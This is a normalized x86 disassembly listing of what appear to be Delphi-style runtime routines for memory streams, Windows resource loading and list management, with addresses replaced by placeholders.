mov edx 0x4
call sub_404e68
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_40a1ac
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40d3a0
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40a1ac
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40d3a0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
jmp r-xdata
sub_419907
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_41992c
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_419968
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_402f9c
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_4199a0
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_4199c4
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax esi
call sub_4199f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_419a08
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_4192e0
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_4194ec
sub_419a40
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_419960
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_419a68
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_419a40
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_419a94
push ebx
push ecx
mov ebx edx
cmp [ ebx ] 0x0
jle r-xdata
mov edx [ eax + 0x4 ]
mov [ esp ] edx
mov ecx [ ebx ]
mov edx [ eax + 0x10 ]
cmp ecx edx
je r-xdata
mov edx [ ebx ]
cmp edx [ eax + 0x8 ]
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
cmp [ ebx ] 0x0
jne r-xdata
mov edx [ ebx ]
add edx 0x1fff
and edx 0xffffe000
mov [ ebx ] edx
test edx edx
jne r-xdata
mov eax [ eax + 0x4 ]
call sub_402d44
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov edx [ ebx ]
mov eax esp
call sub_402d5c
mov eax [ ebx ]
call sub_402d28
mov [ esp ] eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
cmp [ esp ] 0x0
jne r-xdata
sub_419b14
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_402f9c
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_419a40
sub_419b64
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403f34
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404e98
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_419ba8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov esi eax
sub esi [ ebx + 0x8 ]
cmp ecx esi
jge r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebx + 0x4 ]
call j_sub_405330
mov edx [ ebx + 0x8 ]
add eax edx
mov edx edi
mov ecx esi
call sub_402f9c
add [ ebx + 0x8 ] esi
mov eax esi
pop edi
pop esi
pop ebx
retn
mov esi ecx
sub_419be8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi ecx
mov edx [ ebx + 0x8 ]
add edx esi
lea eax [ ebx + 0x4 ]
call sub_4055ac
lea eax [ ebx + 0x4 ]
call j_sub_405330
mov edx [ ebx + 0x8 ]
lea edx [ eax + edx ]
mov eax edi
mov ecx esi
call sub_402f9c
add [ ebx + 0x8 ] esi
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_419c20
push ebx
sub cx 0x1
jb r-xdata
mov [ eax + 0x8 ] edx
jmp r-xdata
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
test edx edx
je r-xdata
add [ eax + 0x8 ] edx
jmp r-xdata
dec cx
je r-xdata
mov ebx [ eax + 0x8 ]
cmp edx ebx
jge r-xdata
sub edx 0x4
mov edx [ edx ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
jmp r-xdata
test ebx ebx
jge r-xdata
mov edx ecx
test edx edx
je r-xdata
sub ecx edx
mov [ eax + 0x8 ] ecx
sub ecx 0x4
mov ecx [ ecx ]
mov eax [ eax + 0x8 ]
pop ebx
retn
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x8 ] edx
jmp r-xdata
sub edx 0x4
mov edx [ edx ]
sub_419c80
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x4 ]
mov edx esi
call sub_4055ac
cmp esi [ ebx + 0x8 ]
jge r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] esi
sub_419c9c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403f34
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
call sub_405324
mov ecx eax
mov edx esi
mov eax edi
call sub_419d94
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_419cf4
push ebp
mov ebp esp
add esp 0xfffffff0
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419d86
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40503c
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40987c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d8d
lea eax [ ebp - 0x10 ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_419d94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_419cf4
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_419960
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebp
call sub_419cf4
pop ecx
sub_419e00
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_419e48
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_402d28
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_419e90
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_402d44
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_419f94
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_404e98
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_404e98
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_419fec
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
movzx edx [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404f34
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4053c4
mov al 0x1
inc ebx
sub_41a044
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a0bb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_406af4
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_413914
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a0c2
lea eax [ ebp - 0x4 ]
call sub_406af4
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_413128
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_406af4
mov ecx eax
mov eax esi
pop edx
call sub_40f8f0
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_406af4
sub_41a0c8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41a171
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a178
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov [ ebp - 0x8 ] edi
movzx eax [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_404f34
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41df7c
mov esi eax
test esi esi
jne r-xdata
add al 0xd3
sub al 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_4092e0
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41a194
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_416824
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_416824
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_416668
sub_41a1cc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_416824
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_416824
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_4166b4
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_416668
sub_41a214
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41a3d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_416b90
mov edi eax
xor eax eax
push ebp
push sub_41a3b1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a3b8
mov eax [ rw-data ]
call sub_416bf4
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a392
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41a340
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_4167c8
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41630c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a347
mov eax [ ebp - 0x8 ]
call sub_403f64
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4132a8
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41a194
pop ecx
mov edx esi
mov eax edi
call sub_4166b4
mov eax ebx
call sub_403f64
jmp r-xdata
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x2
jne r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41a1cc
pop ecx
inc esi
push ebp
mov eax [ ebx + 0x4 ]
call sub_41a1cc
pop ecx
inc esi
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41a0c8
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
jmp r-xdata
sub_41a347
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403f64
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4167c8
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
sub_41a3e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_416b90
mov edi eax
xor eax eax
push ebp
push sub_41a47b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416bf4
retn
mov edx ebx
mov eax edi
call sub_4167c8
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_4166b4
mov eax esi
call sub_403f64
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4092e0
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41a48c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_416b90
mov edi eax
xor eax eax
push ebp
push sub_41a503
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416bf4
retn
mov edx ebx
mov eax edi
call sub_4167c8
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_4166b4
mov eax esi
call sub_403f64
sub_41a534
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
pop ecx
pop edx
pop ebx
retn
sub_41a578
push ebx
push esi
push edi
call sub_404330
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419e90
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_41a5b4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41c62c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41c73c
call sub_41a528
sub_41a5d8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x80 ]
mov eax esi
call sub_4092e0
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x80 ]
call sub_404e44
sub_41a614
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x80 ]
mov eax ebx
call sub_4092e0
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c62c
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41a6de
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41ab18
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41ab18
mov eax [ ebp - 0x4 ]
mov [ eax + 0x88 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a6e5
mov eax [ ebp - 0x8 ]
call sub_403f64
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41c73c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x88 ] 0x1
call sub_41a528
sub_41a710
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x62 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_41a734
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x1
lea eax [ ebp - 0x10c ]
mov edx [ ebp - 0x8 ]
mov ecx 0xff
call sub_4050fc
lea edx [ ebp - 0x10c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4041e8
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
cmp [ esi ] 0x0
sete [ ebp - 0x9 ]
push esi
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov [ esi ] eax
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_41a7bc
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_4050fc
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4041e8
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41a528
sub_41a824
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_416b90
mov esi eax
xor edx edx
push ebp
push sub_41a894
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a89b
mov eax [ rw-data ]
call sub_416bf4
retn
mov edx ebx
mov eax esi
call sub_4167c8
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403f64
mov edx ebx
mov eax esi
call sub_4166b4
sub_41a8a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41a9d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a9dd
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
xor edx edx
push ebp
push sub_41a9b9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_41aa08
retn
inc eax
mov [ ebp - 0x10 ] eax
xor esi esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4167c8
call sub_41a824
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x7a ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_419fec
test al al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x7c ]
call [ edi + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4167c8
mov ebx eax
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_404edc
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_41a0c8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4167c8
mov edx eax
mov eax [ rw-data ]
call sub_416b08
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_416914
jmp r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
sub_41a9e4
push ebx
mov ebx eax
mov eax ebx
call sub_41aadc
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_4192e0
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41aa08
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403f64
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4167c8
call sub_403f64
inc edi
dec esi
jne r-xdata
sub_41aa44
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
